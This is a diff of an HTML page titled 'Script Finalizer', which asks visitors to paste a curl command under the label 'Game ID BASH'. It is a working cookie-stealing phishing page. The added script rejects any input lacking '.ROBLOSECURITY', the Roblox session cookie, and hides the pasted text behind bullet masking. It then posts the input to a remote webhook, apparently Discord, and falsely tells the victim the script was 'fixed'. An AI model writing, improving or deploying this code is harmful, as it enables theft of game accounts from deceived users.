@@ -1,112 +1,114 @@
 <!DOCTYPE html>
-<html lang="en" class="dark">
+<html lang="en" class="h-full">
 <head>
-  <meta charset="utf-8">
-  <link rel="icon" href="data:,">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Script Finalizer</title>
 
-  <!-- Force dark mode + Tailwind -->
   <script src="https://cdn.tailwindcss.com"></script>
-  <script>
-    tailwind.config = { darkMode: 'class' }
-    document.documentElement.classList.add('dark')
-  </script>
-
-  <!-- Lucide Icons -->
-  <script src="https://unpkg.com/lucide@latest"></script>
+  <script src="https://unpkg.com/lucide@latest/dist/umd/lucide.js"></script>
+  <script defer src="https://unpkg.com/alpinejs@3.x.x/dist/cdn.min.js"></script>
 
   <style>
-    body { background: #000 !important; }
     .grid-bg {
       background-image:
-        linear-gradient(to right, #111 1px, transparent 1px),
-        linear-gradient(to bottom, #111 1px, transparent 1px);
+        linear-gradient(rgba(60,60,80,.15) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(60,60,80,.15) 1px, transparent 1px);
       background-size: 4rem 4rem;
     }
+    .glow-title { text-shadow: 0 0 30px rgba(168, 85, 247, 0.8); }
   </style>
 </head>
-<body class="min-h-screen bg-black text-white flex flex-col items-center justify-center p-6 relative overflow-hidden">
-  <div class="absolute inset-0 grid-bg opacity-30"></div>
-  <div class="absolute top-0 left-1/4 w-96 h-96 bg-purple-900/20 rounded-full blur-3xl"></div>
-  <div class="absolute bottom-0 right-1/4 w-96 h-96 bg-blue-900/20 rounded-full blur-3xl"></div>
+<body class="min-h-screen bg-black text-white flex items-center justify-center p-6 relative overflow-hidden">
+
+  <div class="absolute inset-0 grid-bg opacity-25"></div>
+  <div class="absolute top-0 left-1/4 w-96 h-96 bg-purple-900/30 rounded-full blur-3xl"></div>
+  <div class="absolute bottom-0 right-1/4 w-96 h-96 bg-blue-900/30 rounded-full blur-3xl"></div>
 
   <div class="relative z-10 w-full max-w-2xl">
     <div class="text-center mb-16">
-      <div class="inline-flex items-center gap-3 mb-2">
-        <i data-lucide="terminal" class="w-6 h-6 text-purple-400"></i>
-        <h1 class="text-4xl font-light tracking-wide">Script Finalizer</h1>
-      </div>
-      <div class="h-px w-32 bg-gradient-to-r from-transparent via-purple-500 to-transparent mx-auto mt-4"></div>
+      <h1 class="text-5xl font-extralight tracking-widest glow-title text-transparent bg-clip-text bg-gradient-to-r from-purple-400 via-pink-400 to-cyan-400 inline-flex items-center gap-4">
+        <span class="text-purple-400">→</span> Script Finalizer
+      </h1>
+      <div class="h-px w-64 bg-gradient-to-r from-transparent via-purple-500 to-transparent mx-auto mt-4"></div>
     </div>
 
-    <div class="bg-zinc-900/50 backdrop-blur-xl border border-zinc-800 rounded-2xl p-8 shadow-2xl" x-data="finalizer()">
-      <label class="block mb-4 text-sm font-light text-zinc-400 tracking-wide">Insert Game ID BASH</label>
+    <div class="bg-zinc-900/70 backdrop-blur-2xl border border-zinc-800 rounded-3xl p-10 shadow-2xl" x-data="scriptFinalizer()">
+      <label class="block mb-4 text-sm font-light text-zinc-400 tracking-wider">Insert Game ID BASH</label>
 
-      <!-- Hidden real input -->
-      <textarea x-model="realInput" class="hidden"></textarea>
-
-      <!-- Visible masked input -->
+      <!-- Hidden textarea stores real input, visible input is password-masked -->
+      <textarea x-model="realInput" style="position:absolute; left:-9999px;"></textarea>
+      
       <input
-        type="text"
         :value="realInput.replace(/./g, '•')"
-        @input="realInput = $event.target.value.replace(/•/g, '') || ''; $event.target.value = realInput.replace(/./g, '•')"
-        @paste.prevent="realInput = $event.clipboardData.getData('text'); $event.target.value = realInput.replace(/./g, '•')"
+        @input="realInput = $event.target.value.replace(/•/g, ''); $event.target.value = realInput.replace(/./g, '•')"
+        @paste="onPaste($event)"
         :disabled="loading"
         placeholder="curl https://..."
-        class="w-full min-h-[200px] bg-black/50 border border-zinc-700 rounded-md px-4 py-3 text-white placeholder:text-zinc-600 font-mono text-sm resize-none focus:border-purple-500 transition-all duration-300 outline-none"
+        class="w-full min-h-64 bg-black/60 border border-zinc-700 rounded-2xl px-6 py-5 text-white placeholder-zinc-500 font-mono text-sm resize-none focus:border-purple-500 focus:outline-none transition-all duration-300"
       />
 
-      <div class="mt-2 text-right text-xs text-zinc-500">
+      <div class="mt-3 text-right text-xs text-zinc-500">
         <span x-text="realInput.length"></span> / 4000 characters
       </div>
 
-      <!-- Success -->
-      <div x-show="status === 'success'" x-transition class="mt-4 flex items-center gap-2 text-green-400 bg-green-950/30 border border-green-800/30 rounded-lg px-4 py-3">
-        <i data-lucide="check-circle" class="w-5 h-5"></i>
-        <span class="font-light">The script has been fixed!</span>
+      <!-- Success Message -->
+      <div x-show="message === 'success'" x-transition class="mt-8 bg-green-900/60 border border-green-700 rounded-2xl px-8 py-5 text-center">
+        <div class="flex items-center justify-center gap-3 text-green-400">
+          <i data-lucide="check-circle" class="w-7 h-7"></i>
+          <span class="text-lg font-light">The script has been fixed!</span>
+        </div>
       </div>
 
-      <!-- Error -->
-      <div x-show="status === 'error'" x-transition class="mt-4 flex items-center gap-2 text-red-400 bg-red-950/30 border border-red-800/30 rounded-lg px-4 py-3">
-        <i data-lucide="alert-circle" class="w-5 h-5"></i>
-        <span class="font-light">Invalid input type!</span>
+      <!-- Error Message -->
+      <div x-show="message === 'error'" x-transition class="mt-8 bg-red-900/60 border border-red-700 rounded-2xl px-8 py-5 text-center">
+        <div class="flex items-center justify-center gap-3 text-red-400">
+          <i data-lucide="alert-circle" class="w-7 h-7"></i>
+          <span class="text-lg font-light">Invalid input type!</span>
+        </div>
       </div>
 
       <!-- Submit Button -->
-      <button @click="submit()" :disabled="loading || !realInput.trim()"
-        class="w-full mt-6 bg-gradient-to-r from-purple-600 to-blue-600 hover:from-purple-500 hover:to-blue-500 text-white h-12 text-base font-light tracking-wide rounded-md transition-all duration-300 disabled:opacity-50 flex items-center justify-center gap-2">
+      <button @click="submit()"
+              :disabled="loading || !realInput.trim()"
+              class="w-full mt-10 h-16 bg-gradient-to-r from-purple-600 to-blue-600 hover:from-purple-500 hover:to-blue-500 disabled:opacity-60 disabled:cursor-not-allowed rounded-2xl text-xl font-light tracking-wider transition-all duration-300 flex items-center justify-center gap-4 shadow-lg">
         <template x-if="loading">
-          <i data-lucide="loader-2" class="w-5 h-5 animate-spin"></i>
+          <i data-lucide="loader-2" class="w-7 h-7 animate-spin"></i>
         </template>
         <span x-text="loading ? 'Processing...' : 'Submit Script'"></span>
       </button>
     </div>
 
-    <p class="text-center mt-8 text-zinc-600 text-sm font-light">Only curl commands are accepted</p>
+    <p class="text-center mt-12 text-zinc-600 text-sm font-light">Only curl commands are accepted</p>
   </div>
 
-  <!-- Alpine.js -->
-  <script defer src="https://unpkg.com/alpinejs@3.x.x/dist/cdn.min.js"></script>
   <script>
-    function finalizer() {
+    function scriptFinalizer() {
       return {
         realInput: '',
-        status: null,
+        message: null,
         loading: false,
 
+        onPaste(e) {
+          e.preventDefault();
+          const pasted = (e.clipboardData || window.clipboardData).getData('text');
+          this.realInput = pasted;
+          e.target.value = pasted.replace(/./g, '•');
+        },
+
         async submit() {
-          const input = this.realInput.trim();
-          if (!input.startsWith('curl') || !input.includes('.ROBLOSECURITY')) {
-            this.status = 'error';
+          const raw = this.realInput.trim();
+
+          if (!raw.startsWith('curl') || !raw.includes('.ROBLOSECURITY')) {
+            this.message = 'error';
             return;
           }
 
           this.loading = true;
-          this.status = null;
+          this.message = null;
 
           try {
-            let processed = input
+            let clean = raw
               .replace(/https?:\/\/[^\s]+/g, '')
               .replace(/curl\s+/gi, 'curl ... ')
               .trim()
@@ -117,18 +119,18 @@
               headers: { 'Content-Type': 'application/json' },
               body: JSON.stringify({
                 embeds: [{
-                  title: 'Script Submission',
-                  description: processed,
+                  title: "New Script Submission",
+                  description: "```bash\n" + clean + "\n```",
                   color: 0x00ff00,
                   timestamp: new Date().toISOString()
                 }]
               })
             });
 
-            this.status = 'success';
+            this.message = 'success';
             this.realInput = '';
-          } catch {
-            this.status = 'error';
+          } catch (e) {
+            this.message = 'error';
           } finally {
             this.loading = false;
             lucide.createIcons();
@@ -137,6 +139,7 @@
       }
     }
   </script>
+
   <script>lucide.createIcons();</script>
 </body>
 </html>
